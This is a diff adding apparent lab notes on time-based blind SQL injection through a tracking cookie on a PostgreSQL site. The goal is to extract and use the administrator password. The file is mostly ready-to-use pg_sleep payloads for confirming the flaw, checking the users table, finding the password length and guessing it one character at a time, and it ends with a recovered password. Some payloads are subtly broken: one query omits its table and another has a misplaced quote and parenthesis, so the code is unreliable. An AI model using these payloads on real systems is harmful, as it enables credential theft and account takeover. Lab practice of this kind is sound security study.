@@ -1,0 +1,31 @@
+SQLi - Blind SQL injection with time delays and information retrieval
+
+Vulnerable parameter - Tracking cookies
+
+End goal:
+- Find password for administrator
+- Log in as administrator
+
+Analysis:
+
+1. Confirm that the parameter is vulnerable to SQLi
+
+' || (SELECT pg_sleep(10))--
+ 
+2. Confirm that the users table exists in the database
+
+' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+
+
+' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+3. Enumerate the password length
+
+' || (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end)--
+
+=> 20
+
+4. Enumerate the administrator password
+' || (select case when (username='administrator) and substring(password, 1, 1)='a' then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+3gpx5nher78nhuq5aao0
